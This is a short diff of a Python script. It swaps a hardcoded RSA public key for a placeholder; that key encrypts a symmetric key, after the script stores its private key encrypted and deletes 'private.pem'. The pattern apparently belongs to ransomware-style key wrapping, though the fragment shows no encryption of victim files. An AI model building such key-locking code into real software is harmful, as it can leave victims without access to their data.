@@ -93,15 +93,8 @@ with open("private_pem.encrypted", 'wb') as fout:
 
 os.remove("private.pem")
 
-spub=b"""-----BEGIN RSA PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5Q5nmx7aHoCMJMsyCxHi
-sKBEH8N27QQE56X2zfNyWDJR4WuOwsYkJpP/UkCqcpJCs6f/QS8GmwU8P4peWPZ1
-HYqYi12LQhPJfWemVLM5JlxuRw5aS1upD13i1xyMsosw80iRBaYev5VkModv8flv
-WVte78NcmtQfiC0bU/BgSgRGegaH+PORgeHfLi4vaEmiaMTFpzuy6R+u9dtjGGmg
-bEZN23bccs0hfqCimbJ8zaWF4cZbiZpZJNKvaQ7pLML8qNu5bVV5T+f3YeW/jf92
-XLgTQbt/fgXXcu0Oyfkt8PWxbd6s8jSGZGYVMyRk2t807BMj7nlHE8B7qc2xR+DP
-mwIDAQAB
------END RSA PUBLIC KEY-----"""
+spub=b"""your hard coded rsa public key"""
+
 keypub = RSA.import_key(spub)
 cipher_rsa1 = PKCS1_OAEP.new(keypub)
 enc_cpriv_aes = cipher_rsa1.encrypt(key1)
